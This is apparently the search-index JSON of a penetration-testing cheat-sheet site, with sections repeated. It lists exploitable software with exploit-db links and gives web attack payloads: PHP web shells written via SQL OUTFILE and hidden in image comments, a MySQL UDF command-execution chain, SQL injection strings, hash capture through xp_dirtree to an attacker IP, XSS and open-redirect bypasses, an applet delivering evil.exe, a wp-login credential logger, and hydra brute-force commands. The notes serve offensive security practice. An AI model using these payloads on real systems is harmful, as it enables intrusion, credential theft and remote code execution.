/ http / rejetto_hfs_exec AChat 0.150 beta7 Buffer Overflow https://www.exploit-db.com/exploits/36025 exploit / windows / misc / achat_bof Apache James 2.3.2 RCE https://www.exploit-db.com/exploits/35513/ htb_solidstate Elastix 2.2.0 LFI https://www.exploit-db.com/exploits/37637 ColdFusion 8.0.1 CVE-2009-2265 File upload https://arrexel.com/coldfusion-8-0-1-arbitrary-file-upload/ exploit / windows / http / coldfusion_fckeditor Xdebug RCE https://github.com/gteissier/xdebug-shell https://github.com/vulhub/vulhub/tree/master/php/xdebug-rce IRCD 3.2.8.1 CVE-2010-2075 RCE https://www.exploit-db.com/exploits/13853 exploit / unix / irc / unreal_ircd_3281_backdoor Haraka SMTP 2.8.9 RCE https://www.exploit-db.com/exploits/41162 Zabbix 2.2 3.0.3 RCE https://www.exploit-db.com/exploits/39937 CouchDB 2.1.0 CVE-2017-12636 RCE https://www.exploit-db.com/exploits/44913/ https://justi.cz/security/2017/11/14/couchdb-rce-npm.html PlaySMS 1.4 RCE https://www.exploit-db.com/exploits/42044 ImageMagick 6.9.3-9 CVE-2016\u20133714 RCE dompdf 0.6.0 LFI https://www.exploit-db.com/exploits/33004/ vsftpd 2.3.4 Shell / RCE / Backdoor https://github.com/In2econd/vsftpd-2.3.4-exploit/blob/master/vsftpd_234_exploit.py exploit / unix / ftp / vsftpd_234_backdoor SLMail WarFTP 1.65 XAMPP 1.7.2 \u2013 https://www.exploit-db.com/exploits/10391/ 3Com TFTP 2.0.1 Web Applications Pfsense = 2.2.6 Command Injection https://www.exploit-db.com/exploits/39709/ Drupal 7.x RCE https://www.exploit-db.com/exploits/41564 October CMS 1.0.412 RCE, PHP object injection https://www.exploit-db.com/exploits/41936 NibbleBlog Usernames: /nibbleblog/content/private/users.xml Apache Struts 2.3.x before 2.3.32 2.5.x before 2.5.10.1 RCE CVE-2017-5638 https://github.com/mazen160/struts-pwn PHPLiteAdmin 1.9.2 RCE https://www.exploit-db.com/exploits/24044 PiHole sudo pihole - a - p PASSWORD UnrealIRCD 3.2.8.1 Backdoor RCE https://www.exploit-db.com/exploits/16922 HelpDeskZ RCE https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Vulnerabilities/Web/helpdeskz-file-enum.md Pfsense Pfsense 2.1.4 Command Injection https://www.exploit-db.com/exploits/43560 [PfSense Vulnerabilities Part 2: Command Injection - https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/ [PfSense Vulnerabilities Part 3: Local File Inclusion - https://www.proteansec.com/linux/pfsense-vulnerabilities-part-3-local-file-inclusion/ [PfSense Vulnerabilities Part 4: Directory Traversal - https://www.proteansec.com/linux/pfsense-vulnerabilities-part-4-directory-traversal/ Magento ExploitDB: 37977 (change password), 37811 https://dustri.org/b/writing-a-simple-extensionbackdoor-for-magento.html https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper http://www.ethanjoachimeldridge.info/tech-blog/exploiting-magento https://0xdf.gitlab.io/2019/09/28/htb-swagshop.html Plugins to exploit: https://pluginarchive.com/magento/magpleasure_filesystem https://github.com/lavalamp-/LavaMagentoBD","title":"Vulnerable"},{"location":"vulnerable/#desktop-applications","text":"Chkrootkit 0.49 Prev Esc https://www.exploit-db.com/exploits/33899 Mozilla Firefox 45.0 RCE https://www.exploit-db.com/exploits/42484 Zervit 0.4 Acrobat Reader version 8.1.2 \u2013 ftp://ftp.adobe.com/pub/adobe/reader/win/8.x/8.1.2/enu/AdbeRdr812_en_US.exe Java 7 Update 6 JRE \u2013 http://www.oracle.com/technetwork/java/javase/downloads/java-archive-downloads-javase7-521261.html Winamp 5.5 \u2013 http://www.filehorse.com/download-winamp/4137/download/","title":"Desktop Applications"},{"location":"vulnerable/#server-applications","text":"HttpFileServer 2.3x before 2.3c CVE-2014-6287 RCE https://www.exploit-db.com/exploits/39161 exploit / windows / http / rejetto_hfs_exec AChat 0.150 beta7 Buffer Overflow https://www.exploit-db.com/exploits/36025 exploit / windows / misc / achat_bof Apache James 2.3.2 RCE https://www.exploit-db.com/exploits/35513/ htb_solidstate Elastix 2.2.0 LFI https://www.exploit-db.com/exploits/37637 ColdFusion 8.0.1 CVE-2009-2265 File upload https://arrexel.com/coldfusion-8-0-1-arbitrary-file-upload/ exploit / windows / http / coldfusion_fckeditor Xdebug RCE https://github.com/gteissier/xdebug-shell https://github.com/vulhub/vulhub/tree/master/php/xdebug-rce IRCD 3.2.8.1 CVE-2010-2075 RCE https://www.exploit-db.com/exploits/13853 exploit / unix / irc / unreal_ircd_3281_backdoor Haraka SMTP 2.8.9 RCE https://www.exploit-db.com/exploits/41162 Zabbix 2.2 3.0.3 RCE https://www.exploit-db.com/exploits/39937 CouchDB 2.1.0 CVE-2017-12636 RCE https://www.exploit-db.com/exploits/44913/ https://justi.cz/security/2017/11/14/couchdb-rce-npm.html PlaySMS 1.4 RCE https://www.exploit-db.com/exploits/42044 ImageMagick 6.9.3-9 CVE-2016\u20133714 RCE dompdf 0.6.0 LFI https://www.exploit-db.com/exploits/33004/ vsftpd 2.3.4 Shell / RCE / Backdoor https://github.com/In2econd/vsftpd-2.3.4-exploit/blob/master/vsftpd_234_exploit.py exploit / unix / ftp / vsftpd_234_backdoor SLMail WarFTP 1.65 XAMPP 1.7.2 \u2013 https://www.exploit-db.com/exploits/10391/ 3Com TFTP 2.0.1","title":"Server Applications"},{"location":"vulnerable/#web-applications","text":"Pfsense = 2.2.6 Command Injection https://www.exploit-db.com/exploits/39709/ Drupal 7.x RCE https://www.exploit-db.com/exploits/41564 October CMS 1.0.412 RCE, PHP object injection https://www.exploit-db.com/exploits/41936 NibbleBlog Usernames: /nibbleblog/content/private/users.xml Apache Struts 2.3.x before 2.3.32 2.5.x before 2.5.10.1 RCE CVE-2017-5638 https://github.com/mazen160/struts-pwn PHPLiteAdmin 1.9.2 RCE https://www.exploit-db.com/exploits/24044 PiHole sudo pihole - a - p PASSWORD UnrealIRCD 3.2.8.1 Backdoor RCE https://www.exploit-db.com/exploits/16922 HelpDeskZ RCE https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Vulnerabilities/Web/helpdeskz-file-enum.md","title":"Web Applications"},{"location":"vulnerable/#pfsense","text":"Pfsense 2.1.4 Command Injection https://www.exploit-db.com/exploits/43560 [PfSense Vulnerabilities Part 2: Command Injection - https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/ [PfSense Vulnerabilities Part 3: Local File Inclusion - https://www.proteansec.com/linux/pfsense-vulnerabilities-part-3-local-file-inclusion/ [PfSense Vulnerabilities Part 4: Directory Traversal - https://www.proteansec.com/linux/pfsense-vulnerabilities-part-4-directory-traversal/","title":"Pfsense"},{"location":"vulnerable/#magento","text":"ExploitDB: 37977 (change password), 37811 https://dustri.org/b/writing-a-simple-extensionbackdoor-for-magento.html https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper http://www.ethanjoachimeldridge.info/tech-blog/exploiting-magento https://0xdf.gitlab.io/2019/09/28/htb-swagshop.html Plugins to exploit: https://pluginarchive.com/magento/magpleasure_filesystem https://github.com/lavalamp-/LavaMagentoBD","title":"Magento"},{"location":"web/","text":"Vulnerabilities Command Injection Bypass w \\ h \\ o \\ a \\ m \\ i \\ w \\ h \\ o \\ a \\ m \\ i Tools Commix - https://github.com/commixproject/commix Usage examples: https://github.com/commixproject/commix/wiki/Usage-Examples CRLF https://speakerdeck.com/shikarisenpai/crlf-and-openredirect-for-dummies?slide=28 Tools CRLF-Injection-Scanner: https://github.com/MichaelStott/CRLF-Injection-Scanner/blob/master/crlf_scan.py CRLF - Auto CRLF Injector: https://github.com/rudSarkar/crlf-injector Payloads https://github.com/cujanovic/CRLF-Injection-Payloads/blob/master/CRLF-payloads.txt https://github.com/mubix/tools/blob/master/fuzzdb/attack-payloads/http-protocol/crlf-injection.fuzz.txt CSRF Methodology: https://twitter.com/Alra3ees/status/1076021203117195265 CSRF Cheatsheet: https://trustfoundry.net/cross-site-request-forgery-cheat-sheet/ Tools XSRFProbe: https://github.com/0xInfection/XSRFProbe File Upload Bypass Null Byte: %00 to bypass file name restrictions ( wpes . php % 00 . png ) Suffix file name with % ( example . php % ) Double Extensions: wpes . png . php valid . txt . php Altering content type Magic number: (Example: gif: GIF89a ; ) Put GIF89a ; \u200b as the first line in the file and save the file with a \u200b .gif \u200b extension https://blog.netspi.com/magic-bytes-identifying-common-file-formats-at-a-glance/ Code in image comment: exiftool - Comment = ?php echo pre ; system ( $_GET [ cmd ]); ? lo . jpg Alternative Extensions PHP - pht, phpt, phtml, php3, php4, php5, php6, php7 CFM - cfml, cfc, dbm ASP - aspx Perl - pl, pm, cgi, lib JSP - jspx, jsw, jsv, jspf Open Redirect Scenarios Grab tokens via mis-configured apps/login flows Bypassing blacklists for SSRF/RCE XSS via \"location.href = 'javascript:alert(0)1'\" Taking advantage of fileuploads and mobile devices Bypasses https % 3 A % 2 F % 2 Fmysite . com % 2 F https % 3 A % 2 F % 2 Fexample . com % 2 F % 3 Freturnurl % 3 D % 2 F % 2 Fmysite . com % 2 F \\ / yoururl . com \\ / \\ / yoururl . com \\\\ yoururl . com // yoururl . com // theirsite @ yoursite . com https : // yoursite ? c = . theirsite . com / https : // yoursite . com #. theirsite . com / https : // yoursite . com \\. thersite . com / //% 2 F / yoursite . com //// yoursite . com https : // theirsite . computer / - ( if they just check for * theirsite . com * , . computer is a valid tld ! https : // theirsite . com . mysite . com - ( Treat their domain as subdomain to yours ) /% 0 D / yoursite . com - ( Also try % 09 , % 00 , % 0 a , % 07 ) java % 0 d % 0 ascript % 0 d % 0 a : alert ( 0 ) , j % 0 d % 0 aava % 0 d % 0 aas % 0 d % 0 acrip % 0 d % 0 at % 0 d % 0 a : confirm ` 0 ` , java % 07 script : prompt ` 0 ` , java % 09 scrip % 07 t : prompt ` 0 ` https://www.bugbountynotes.com/training/tutorial?id=1 SSRF SSRF - Server Side Request Forgery (Types and ways to exploit it) Part-1: https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978 SSRF - Server Side Request Forgery (Types and ways to exploit it) Part-2: https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-2-a085ec4332c0 SSRF - Server Side Request Forgery (Types and ways to exploit it) Part-3: https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-3-b0f5997e3739 Tools https://github.com/swisskyrepo/SSRFmap SQL Injection https://www.websec.ca/kb/sql_injection#Extra_About https://docs.google.com/document/d/1z2ozmSfUtT_3RBUM_1FFpTEYj7yKoGBpPlASz_iShsg/edit https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/ Tools SqlMap: sqlmap - r sqlmap . req --level=5 --risk=3 --dump-all\u200b AutoSQLi: https://github.com/jesuiscamille/AutoSQLi SQLiDumper: https://www.cybrary.it/0p3n/pentesting-sqli-dumper-v8-tool/ Automatic SQL injection with Charles and sqlmap api http://0r1.me/SQLiScanner/ https://github.com/0xbug/SQLiScanner Payload Combines blind command injection and blind sql injection (mysql) in one payload (works with no quotes/single quotes and double quotes): https://mobile.twitter.com/bl4ckh4ck5/status/1100167033407320065 /*$(sleep 5)`sleep 5``*/ sleep ( 5 ) # /*$(sleep 5)`sleep 5` #*/||sleep(5)|| ||sleep(5)|| ` WebShell over MySQL: SELECT ?php echo shell_exec ( $_GET [ c ]); ? INTO OUTFILE /var/www/html/example.php User Defined Functions (UDF) (sqlmap/udf/mysql) SELECT @@ plugin_dir ; PowerShell$ Convert - Dll - DllPath lib_mysqludf_sys . dll - OutputPath bytes . txt SELECT CHAR ( 64 , 64 ,....) INTO OUTFILE @@plugin_dir /lib_mysqludf_sys.dll FIELDS ESCAPED BY ; CREATE FUNCTION sys_eval RETURNS STRING SONAME lib_mysqludf_sys.dll ; SELECT sys_eval ( whoami ); Simple payloads: or 1=1 LIMIT 1 -- or 1 = 1 LIMIT 1 -- - or 1=1 LIMIT 1# or 1 # or 1=1 -- or 1 = 1 -- - Order by to get column count: 1337 order by N Read file: LOAD_FILE ( /etc/passwd ) Read from information schema: union select 1 , 2 , group_concat ( distinct table_schema separator , ) from information_schema . tables LIMIT 1 , 1 union select 1 , 2 , group_concat ( distinct table_name separator , ) from information_schema . tables where table_schema = security LIMIT 1 , 1 Write to file: select 1 , 2 , 3 , 4 , ?php echo system ( $_GET [ cmd ]); ? , 6 INTO OUTFILE C:\\htdocs\\webroot\\shell.php SQL Server Run Responder and do following to capture hashes: EXEC ( master .. xp_dirtree ( \\\\ (ATTACKER IP ADDRESS)\\foo ) -- Add a trigger to do a malicious action (price 0) Language Specific PHP Good example from DOCs, where parameterization is not used: http://php.net/manual/en/mysqli.examples-basic.php (use: https://phptherightway.com/ ) Practice https://github.com/Audi-1/sqli-labs LFI / RFI Universal LFI for Windows + PHP (using phpinfo): https://rdot.org/forum/showthread.php?t=1134 PHP LFI to arbitrary code execution via rfc1867 file upload temporary files Payloads including uploaded files include data:// or php://input, php://filter pseudo protocol including logs including /proc/self/environ include session files - (usually names /tmp/sess_SESSIONID) include other files created by PHP application C :\\ Windows \\ Temp \\ php 16 - bit - random . TMP without bruteforce can do inc = C : \\ Windows \\ Temp \\ php LFI to RCE RCE with TXT upload Expose .txt file and use a vulnerable include to include the txt file into code (evil.txt.php). PHP config can be used to disable URL file access. But still local files can be accessed (allow_url_fopen / allow_url_include) RCE with Logs Use NC to write logs with malicious content to access_logs. Connect and just send the attack string (In user-agent etc.). Then include the log file (local file inclusion) RCE over SQLi Return ?php echo \"test\"? from SQL and see results to check if RCE is possible over SQLi PHP Wrappers File upload with POST data curl - s -- data ? system ( ls -la ); ? http://target.host/web.php?file_path=php://input%00 Base64 encode the LFI http : // X . X . X . X /? page = php : // filter / convert . base64 - encode / resource = ( PHP FILE NAME NO EXTENSION ) Path Traversal Payloads .. / .. \\ .. \\ / % 2 e % 2 e % 2f % 252 e % 252 e % 252f %c0%ae%c0%ae%c0%af %uff0e%uff0e%u2215 %uff0e%uff0e%u2216 ... / . / ... \\ . \\ Client Side Attacks XSS Impact: https://somdev.me/21-things-xss/ Tools https://github.com/s0md3v/XSStrike Payloads Fetch an external resource: https://github.com/aurainfosec/xss_payloads/blob/master/fetch.md Advance XSS Persistence With Oauth: https://github.com/dxa4481/XSSOauthPersistence https://blog.secureideas.com/2018/12/twelve-days-of-xssmas.html XSS Cheat Sheet: https://brutelogic.com.br/blog/xss-cheat-sheet/ http://www.xss-payloads.com/payloads.html XSS via Image XSS via HTTP Response Splitting XSS via Cookie XSS via AngularJS Template Injection Applet javac Java.java echo \u201cPermissions: all-\u00ad\u2010permissions\u201d /root/manifest.txt jar cvf Java.jar Java.class added manifest adding: Java.class ( in = 1233 ) ( out = 709 )( deflated 42 % ) keytool -\u00ad\u2010genkey -\u00ad\u2010alias signapplet -\u00ad\u2010keystore mykeystore -\u00ad\u2010keypass mykeypass -\u00ad\u2010storepass password123 jarsigner -\u00ad\u2010keystore mykeystore -\u00ad\u2010storepass password123 -\u00ad\u2010keypass mykeypass -\u00ad\u2010signedjar SignedJava.jar Java.jar signapplet echo applet width= 1 height= 1 id= Java Secure code= Java.class archive= SignedJava.jar param name= 1 value= http://192.168.10.5:80/evil.exe /applet /var/www/java.html Other Browser extensions: LinkedIn browser plugin enumeration: https://github.com/dandrews/nefarious-linkedin Browser, VMEscape and Kernel Exploitation (Chrome/Safari): https://github.com/vngkv123/aSiagaming Other Multiple Ways to Exploiting PUT Method - https://www.hackingarticles.in/multiple-ways-to-exploiting-put-method/ Scenarios Techniques Discovery and Enumeration httprobe - Take a list of domains and probe for working HTTP and HTTPS servers https://github.com/tomnomnom/httprobe cat domains . txt | httprobe | tee alive . txt cat domains . txt | httprobe - p http : 8080 - p https : 4443 | tee alive . txt VHost VHostScan: https://github.com/codingo/VHostScan Subdomains wfuzz -u https:// ( TARGET DOMAIN NAME ) -w /infosec/wordlists/SecLists/Discovery/DNS/subdomains-list-5000.txt -H Host: FUZZ.(TARGET DOMAIN NAME) Files and Folders Gobuster: https://github.com/OJ/gobuster #!/bin/bash set -eu URL = $1 echo super go bustering for super brute: $URL gobuster -u $URL -l -s 200 ,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/tomcat.txt gobuster -u $URL -l -s 200 ,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/nginx.txt gobuster -u $URL -l -s 200 ,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/apache.txt gobuster -u $URL -l -s 200 ,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/Top1000-RobotsDisallowed.txt gobuster -u $URL -l -s 200 ,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/ApacheTomcat.fuzz.txt gobuster -u $URL -l -s 200 ,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/sharepoint.txt gobuster -u $URL -l -s 200 ,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/iis.txt gobuster -u $URL -l -s 200 ,204,301,302,307,403 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x txt,php,html,htm DirBuster: https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project EroDir: A fast web directory/file enumeration tool written in Rust: https://github.com/PinkP4nther/EroDir DeepSearch: https://github.com/m4ll0k/DeepSearch Filebuster - An extremely fast and flexible web fuzzer: https://github.com/henshin/filebuster Interesting files pyHAWK: Searches the directory of choice for interesting files. Such as database files and files with passwords stored on them: https://github.com/MetaChar/pyHAWK Hidden directories and files as a source of sensitive information about web application: https://medium.com/@_bl4de/hidden-directories-and-files-as-a-source-of-sensitive-information-about-web-application-84e5c534e5ad Parameters WFuzz - Identity parameter names: wfuzz - c - z file , burp - parameter - names . txt --hh=19 http://10.10.10.69/sync?FUZZ=writeup Word-lists https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.tx Technologies used: WhatWeb - recognises web technologies ( versions): https://github.com/urbanadventurer/WhatWeb Site Mapping https://code.google.com/archive/p/skipfish/ WAF Bypasses Web Application Firewall (WAF) Evasion Techniques: https://medium.com/secjuice/waf-evasion-techniques-718026d693d8 Web Application Firewall (WAF) Evasion Techniques #2: https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0 Web Application Firewall (WAF) Evasion Techniques #3: https://www.secjuice.com/web-application-firewall-waf-evasion/ SSL /TLS Attacks sslyze - Fast and powerful SSL/TLS server scanning library. testssl.sh - Checks any port for the support of TLS/SSL ciphers, protocols as well as recent cryptographic flaws Build a valid SSL certificate chain (or fix an incomplete chain): https://github.com/trimstray/mkchain Brute-forcing W3brute - Automatic Web Application Brute Force Attack Tool: https://github.com/aprilahijriyan/w3brute POST hydra -l ( USERNAME ) -P /path/to/wordlist.txt ( TARGET IP ADDRESS ) \\ http-post-form /URI/path/to/login.php:(HTML FORM USERNAME ATTRIBUTE)=^USER^ (HTML FORM PASSWORD ATTRIBUTE)=^PASS^ Login=Login:(FAILED LOGIN MESSAGE) GET hydra -l admin -P /pwnt/passwords/wordlists/rockyou.txt ( TARGET IP ADDRESS ) \\ http-get-form /login.php:username=^USER^ password=^PASS^ Login=Login:Please Login|Bad Request Fuzzing Cookies wfuzz -z \\ file,/infosec/SecLists/Passwords/Common-Credentials/10-million-password-list-top-500.txt \\ -b passwd = FUZZ http:// ( TARGET IP ADDRESS ) : ( TARGET PORT ) Defense Awesome-WAF - A curated list of awesome web-app firewall (WAF) stuff: https://github.com/0xInfection/Awesome-WAF CMS Drupal Username Enumeration https://raw.githubusercontent.com/weaknetlabs/Penetration-Testing-Grimoire/master/Brute%20Force/Tools/drupalUserEnum.py Password Brute-forcing curl -s http://drupal.site/user/ | grep form_build_id | cut -d \\ -f 6 hydra -l admin -P /wordlists/rockyou.txt ( TARGET DRUPAL IP ) \\ http-form-post /?q=user/:name=admin pass=^PASS^ form_id=user_login form_build_id=form-uQ6n4rbHr99R2XZirfsxaa3rPmV8xpZjXWsa3-G-8Nw:Sorry PHP Code Execution** Enable\u200b PHP Filter\u200b module on the \u200b Modules\u200b Add content\u200b then to \u200b Article Pasting PHP into the article body Changing the \u200b Text format\u200b to \u200bPHP code\u200b Clicking on \u200b Preview\u200b Tools Droopescan - https://github.com/droope/droopescan Wordpress Version discovery** curl -s 192 .168.56.102/wordpress/ | grep generator curl -s 192 .168.56.102/wordpress/readme.html | grep Version curl -s 192 .168.56.102/wordpress/wp-login.php | grep ver= User enumeration for i in $( seq 1 5 ) ; do curl -sL 192 .168.110.105/wordpress/?author = $i | grep title ; done // When stop-user-enumeration plugin installed curl -i -sL 192.168.56.102/wordpress/?wp-comments-post author=1 | grep title curl -sL 192 .168.56.102/wordpress/?wp-comments-post -d author = 1 | grep title // Rest API ( 4 .7+ ) curl -s http://localhost/wp-json/wp/v2/users Theme and plugin enumeration** /wordpress_site/wp-content/plugins/ /wordpress_site/wp-content/themes/ wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/CMS/wp_plugins.fuzz.txt --hc 404 192 .168.56.104/wordpress/FUZZ nmap -sV -p 80 192 .168.56.102 --script = http-wordpress-enum.nse --script-args = http-wordpress-enum.root = /wordpress/ Enumerate users, plugins and themes wpscan - u http : // 192 . 168 . 110 . 105 / wordpress / - e u , ap , at Password Brute-forcing echo admin users . txt echo wpuser users . txt hydra - L users . txt - P lists / 500 . txt - e nsr 192 . 168 . 110 . 105 http - post - form /wordpress/wp-login.php:log=^USER^ pwd=^PASS^ wp-submit=Log+In testcookie=1:S=Location wpscan --users users.txt -w /root/lists/500.txt -u 192.168.110.105/wordpress/ Privilege escalations searchsploit wordpress escalation Log passwords from wp-login.php file_put_contents ( creds.txt , $ _POST [ log ]. - . $ _POST [ pwd ]) Obtain shell Editing the main header.php script of the WordPress site to contain a reverse shell. Uploading a fake plugin containing a reverse shell. Uploading a fake theme containing a reverse shell. http://www.mediafire.com/file/ya0qn83o0b5e3lu/fake-theme.zip nc - lvp 31337 curl 192 . 168 . 56 . 102 / wordpress / wp - content / themes / fake - theme / header . php Tools WPScan - https://github.com/wpscanteam/wpscan Droopescan - https://github.com/droope/droopescan wpBullet - Static code analysis for WordPress Plugins/Themes Joomla Tools Droopescan - https://github.com/droope/droopescan Moodle Tools Droopescan - https://github.com/droope/droopescan SilverStripe Tools Droopescan - https://github.com/droope/droopescan Sharepoint Important files: / _layouts / viewlsts . aspx \u200b Tools BurpSuite Burp Suite Pro Real-life tips tricks: https://www.agarri.fr/docs/HiP2k13-Burp_Pro_Tips_and_Tricks.pdf Extensions Extensions: https://github.com/snoopysecurity/awesome-burp-extensions Turbo Intruder: https://github.com/PortSwigger/turbo-intruder ADAPT is a tool that performs automated Penetration Testing for WebApps https://github.com/secdec/adapt * OTG - IDENT - 004 \u2013 Account Enumeration * OTG - AUTHN - 001 - Testing for Credentials Transported over an Encrypted Channel * OTG - AUTHN - 002 \u2013 Default Credentials * OTG - AUTHN - 003 - Testing for Weak lock out mechanism * OTG - AUTHZ - 001 \u2013 Directory Traversal * OTG - CONFIG - 002 - Test Application Platform Configuration * OTG - CONFIG - 006 \u2013 Test HTTP Methods * OTG - CRYPST - 001 - Testing for Weak SSL / TLS Ciphers , Insufficient Transport Layer Protection * OTG - CRYPST - 002 - Testing for Padding Oracle * OTG - ERR - 001 - Testing for Error Code * OTG - ERR - 002 \u2013 Testing for Stack Traces * OTG - INFO - 002 \u2013 Fingerprinting the Webserver * OTG - INPVAL - 001 - Testing for Reflected Cross site scripting * OTG - INPVAL - 002 - Testing for Stored Cross site scripting * OTG - INPVAL - 003 \u2013 HTTP Verb Tampering * OTG - SESS - 001 - Testing for Session Management Schema * OTG - SESS - 002 \u2013 Cookie Attributes Hawkeye - Project security, vulnerability and general risk highlighting tool: https://github.com/hawkeyesec/scanner-cli Adobe Experience Manager (AEM) hacker toolset: https://github.com/0ang3el/aem-hacker Practice https://www.owasp.org/index.php/OWASP_Hacking_Lab http://www.dvwa.co.uk/ http://www.itsecgames.com/ Damn Vulnerable Serverless Application: https://www.owasp.org/index.php/OWASP_DVSA https://serverlessrepo.aws.amazon.com/applications/arn:aws:serverlessrepo:us-east-1:889485553959:applications~DVSA","title":"Web"},{"location":"web/#vulnerabilities","text":"","title":"Vulnerabilities"},{"location":"web/#command-injection","text":"Bypass w \\ h \\ o \\ a \\ m \\ i \\ w \\ h \\ o \\ a \\ m \\ i Tools Commix - https://github.com/commixproject/commix Usage examples: https://github.com/commixproject/commix/wiki/Usage-Examples","title":"Command Injection"},{"location":"web/#crlf","text":"https://speakerdeck.com/shikarisenpai/crlf-and-openredirect-for-dummies?slide=28 Tools CRLF-Injection-Scanner: https://github.com/MichaelStott/CRLF-Injection-Scanner/blob/master/crlf_scan.py CRLF - Auto CRLF Injector: https://github.com/rudSarkar/crlf-injector Payloads https://github.com/cujanovic/CRLF-Injection-Payloads/blob/master/CRLF-payloads.txt https://github.com/mubix/tools/blob/master/fuzzdb/attack-payloads/http-protocol/crlf-injection.fuzz.txt","title":"CRLF"},{"location":"web/#csrf","text":"Methodology: https://twitter.com/Alra3ees/status/1076021203117195265 CSRF Cheatsheet: https://trustfoundry.net/cross-site-request-forgery-cheat-sheet/ Tools XSRFProbe: https://github.com/0xInfection/XSRFProbe","title":"CSRF"},{"location":"web/#file-upload","text":"Bypass Null Byte: %00 to bypass file name restrictions ( wpes . php % 00 . png ) Suffix file name with % ( example . php % ) Double Extensions: wpes . png . php valid . txt . php Altering content type Magic number: (Example: gif: GIF89a ; ) Put GIF89a ; \u200b as the first line in the file and save the file with a \u200b .gif \u200b extension https://blog.netspi.com/magic-bytes-identifying-common-file-formats-at-a-glance/ Code in image comment: exiftool - Comment = ?php echo pre ; system ( $_GET [ cmd ]); ? lo . jpg Alternative Extensions PHP - pht, phpt, phtml, php3, php4, php5, php6, php7 CFM - cfml, cfc, dbm ASP - aspx Perl - pl, pm, cgi, lib JSP - jspx, jsw, jsv, jspf","title":"File Upload"},{"location":"web/#open-redirect","text":"Scenarios Grab tokens via mis-configured apps/login flows Bypassing blacklists for SSRF/RCE XSS via \"location.href = 'javascript:alert(0)1'\" Taking advantage of fileuploads and mobile devices Bypasses https % 3 A % 2 F % 2 Fmysite . com % 2 F https % 3 A % 2 F % 2 Fexample . com % 2 F % 3 Freturnurl % 3 D % 2 F % 2 Fmysite . com % 2 F \\ / yoururl . com \\ / \\ / yoururl . com \\\\ yoururl . com // yoururl . com // theirsite @ yoursite . com https : // yoursite ? c = . theirsite . com / https : // yoursite . com #. theirsite . com / https : // yoursite . com \\. thersite . com / //% 2 F / yoursite . com //// yoursite . com https : // theirsite . computer / - ( if they just check for * theirsite . com * , . computer is a valid tld ! https : // theirsite . com . mysite . com - ( Treat their domain as subdomain to yours ) /% 0 D / yoursite . com - ( Also try % 09 , % 00 , % 0 a , % 07 ) java % 0 d % 0 ascript % 0 d % 0 a : alert ( 0 ) , j % 0 d % 0 aava % 0 d % 0 aas % 0 d % 0 acrip % 0 d % 0 at % 0 d % 0 a : confirm ` 0 ` , java % 07 script : prompt ` 0 ` , java % 09 scrip % 07 t : prompt ` 0 ` https://www.bugbountynotes.com/training/tutorial?id=1","title":"Open Redirect"},{"location":"web/#ssrf","text":"SSRF - Server Side Request Forgery (Types and ways to exploit it) Part-1: https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978 SSRF - Server Side Request Forgery (Types and ways to exploit it) Part-2: https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-2-a085ec4332c0 SSRF - Server Side Request Forgery (Types and ways to exploit it) Part-3: https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-3-b0f5997e3739 Tools https://github.com/swisskyrepo/SSRFmap","title":"SSRF"},{"location":"web/#sql-injection","text":"https://www.websec.ca/kb/sql_injection#Extra_About https://docs.google.com/document/d/1z2ozmSfUtT_3RBUM_1FFpTEYj7yKoGBpPlASz_iShsg/edit https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/ Tools SqlMap: sqlmap - r sqlmap . req --level=5 --risk=3 --dump-all\u200b AutoSQLi: https://github.com/jesuiscamille/AutoSQLi SQLiDumper: https://www.cybrary.it/0p3n/pentesting-sqli-dumper-v8-tool/ Automatic SQL injection with Charles and sqlmap api http://0r1.me/SQLiScanner/ https://github.com/0xbug/SQLiScanner Payload Combines blind command injection and blind sql injection (mysql) in one payload (works with no quotes/single quotes and double quotes): https://mobile.twitter.com/bl4ckh4ck5/status/1100167033407320065 /*$(sleep 5)`sleep 5``*/ sleep ( 5 ) # /*$(sleep 5)`sleep 5` #*/||sleep(5)|| ||sleep(5)|| ` WebShell over MySQL: SELECT ?php echo shell_exec ( $_GET [ c ]); ? INTO OUTFILE /var/www/html/example.php User Defined Functions (UDF) (sqlmap/udf/mysql) SELECT @@ plugin_dir ; PowerShell$ Convert - Dll - DllPath lib_mysqludf_sys . dll - OutputPath bytes . txt SELECT CHAR ( 64 , 64 ,....) INTO OUTFILE @@plugin_dir /lib_mysqludf_sys.dll FIELDS ESCAPED BY ; CREATE FUNCTION sys_eval RETURNS STRING SONAME lib_mysqludf_sys.dll ; SELECT sys_eval ( whoami ); Simple payloads: or 1=1 LIMIT 1 -- or 1 = 1 LIMIT 1 -- - or 1=1 LIMIT 1# or 1 # or 1=1 -- or 1 = 1 -- - Order by to get column count: 1337 order by N Read file: LOAD_FILE ( /etc/passwd ) Read from information schema: union select 1 , 2 , group_concat ( distinct table_schema separator , ) from information_schema . tables LIMIT 1 , 1 union select 1 , 2 , group_concat ( distinct table_name separator , ) from information_schema . tables where table_schema = security LIMIT 1 , 1 